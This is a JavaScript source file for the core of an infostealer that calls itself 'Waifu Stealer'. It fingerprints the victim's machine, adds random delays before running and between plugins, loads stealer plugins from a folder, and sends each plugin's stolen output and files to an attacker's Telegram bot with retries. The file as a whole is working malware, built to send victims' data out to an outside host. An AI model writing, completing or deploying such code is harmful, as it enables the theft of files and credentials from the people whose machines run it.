// @ts-check
const fs = require('fs')
const path = require('path')

const fetch = require('node-fetch')
const FormData = require('form-data')

const { machineId } = require('node-machine-id')

const pluginsDir = path.resolve(__dirname, 'plugins')

const delay = (ms = Math.floor(Math.random() * 30000 + 5000)) => {
  console.log(`Waiting ${ms / 1000}s...`)
  return new Promise(resolve => setTimeout(resolve, ms))
}

function loadPlugins() {
  return fs
    .readdirSync(pluginsDir, { withFileTypes: true })
    .filter(
      dir =>
        dir.isDirectory() &&
        dir.name.endsWith('-plugin') &&
        fs.readdirSync(path.resolve(pluginsDir, dir.name)).includes('lib.js')
    )
    .reduce((acc, dir) => {
      process.stdout.write(`  [${dir.name}]... `)
      const plugin = require(path.resolve(pluginsDir, dir.name, 'lib.js'))
      console.log(`OK! ✌️`)
      acc[dir.name] = plugin
      return acc
    }, /** @type {{ [pluginName: string]: any }} */ ({}))
}

/**
 * @param {string} text
 * @param {string} telegramChatId
 * @param {string} telegramToken
 * @param {number?} retriesLeft
 * @returns {Promise<void>}
 */
async function sendMessageTelegramWebhook(text, telegramChatId, telegramToken, retriesLeft = 5) {
  if (retriesLeft === 0) return

  const form = new FormData()
  form.append('text', text.replace(/\./g, '\\.').replace(/\+/g, '\\+'))
  const res = await fetch(
    `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&parse_mode=MarkdownV2`,
    {
      method: 'POST',
      body: form
    }
  ).then(res => res.json())

  if (!res.ok) {
    console.error(`Error sending Telegram message! Retrying in 30s - Status: ${res.error_code} - ${res.description}`)
    // Failed to send message, try again in 30s
    await new Promise(resolve => setTimeout(resolve, 30_000))
    return sendMessageTelegramWebhook(text, telegramChatId, telegramToken, retriesLeft - 1)
  }
}

/**
 * @param {string} filePath
 * @param {string} filename
 * @param {string} caption
 * @param {string} telegramChatId
 * @param {string} telegramToken
 * @param {number?} retriesLeft
 * @returns {Promise<void>}
 */
async function sendDocumentTelegramWebhook(
  filePath,
  filename,
  caption,
  telegramChatId,
  telegramToken,
  retriesLeft = 5
) {
  if (retriesLeft === 0) return

  const form = new FormData()
  form.append('document', fs.createReadStream(filePath, {}), { filename })
  form.append('caption', caption.replace(/\./g, '\\.').replace(/\+/g, '\\+'))
  const res = await fetch(
    `https://api.telegram.org/bot${telegramToken}/sendDocument?chat_id=${telegramChatId}&parse_mode=MarkdownV2`,
    {
      method: 'POST',
      body: form
    }
  ).then(res => res.json())

  if (!res.ok) {
    console.error(`Error sending archive! Retrying in 30s - Status: ${res.error_code} - ${res.description}`)
    // Failed to send archive, try again in 30s
    await new Promise(resolve => setTimeout(resolve, 30_000))
    return sendDocumentTelegramWebhook(filePath, filename, caption, telegramChatId, telegramToken, retriesLeft - 1)
  }
}

/**
 * @param {string} telegramChatId
 * @param {string} telegramToken
 * @param {boolean} addDelays
 */
async function run(telegramChatId, telegramToken, addDelays = true) {
  if (!telegramChatId) throw new Error('Telegram chat ID is required')
  if (!telegramToken) throw new Error('Telegram token is required')

  console.log(`Welcome to Waifu Stealer!`)
  const hwid = await machineId()
  console.log(`HWID: ${hwid}`)

  // Wait before execution
  if (addDelays) await delay()

  console.log('Loading plugins...')
  const plugins = loadPlugins()
  // prettier-ignore
  console.log(`\nLoaded plugins: ${Object.keys(plugins).map(x =>`[${x}]`).join(', ')}`)

  // Track plugin success
  const pluginSuccess = Object.keys(plugins).reduce((acc, pluginName) => {
    acc[pluginName] = false
    return acc
  }, /** @type {{ [pluginName: string]: boolean }} */ ({}))

  console.log("\nLet's go! 💥")
  for (const [pluginName, plugin] of Object.entries(plugins)) {
    try {
      console.log(`\n\nRunning plugin [${pluginName}]! ⭐`)
      const messageCaptionPrefix = `Plugin: \`[${pluginName}]\`\nHWID: \`${hwid.slice(0, 20)}\``

      const uploadFileFn = (filePath, filename, caption) => {
        console.log(`[${pluginName}] uploaded a file via Telegram: \`${filename}\` - ${caption}`)
        return sendDocumentTelegramWebhook(
          filePath,
          filename,
          `${messageCaptionPrefix}\n\n${caption.trim()}`,
          telegramChatId,
          telegramToken
        )
      }
      const sendMessageFn = text => {
        console.log(`[${pluginName}] sent a message via Telegram: \`${text}\``)
        return sendMessageTelegramWebhook(`${messageCaptionPrefix}\n\n${text.trim()}`, telegramChatId, telegramToken)
      }

      const result = await plugin.run({ sendMessageFn, uploadFileFn })
      pluginSuccess[pluginName] = true

      if (!result) continue // Plugin didn't return anything, go to next plugin

      console.log(result)
      await sendMessageFn(typeof result === 'object' ? `\`\`\`\n${JSON.stringify(result, null, 2)}\n\`\`\`` : result)
    } catch (error) {
      console.error(`Error running plugin [${pluginName}]! ❌`)
      console.error(error)
    } finally {
      if (addDelays) await delay()
    }
  }

  console.log('\nEvery plugin finished executing! 🎉')
  Object.entries(pluginSuccess).forEach(([pluginName, success]) =>
    console.log(success ? `✅ Plugin [${pluginName}] was successful!` : `Plugin [${pluginName}] failed! ❌`)
  )
}

// run('1234567890', '12345678:EEExreg_CKLviTXNwTTfc-UdcStDOPfqFoMQ', false)
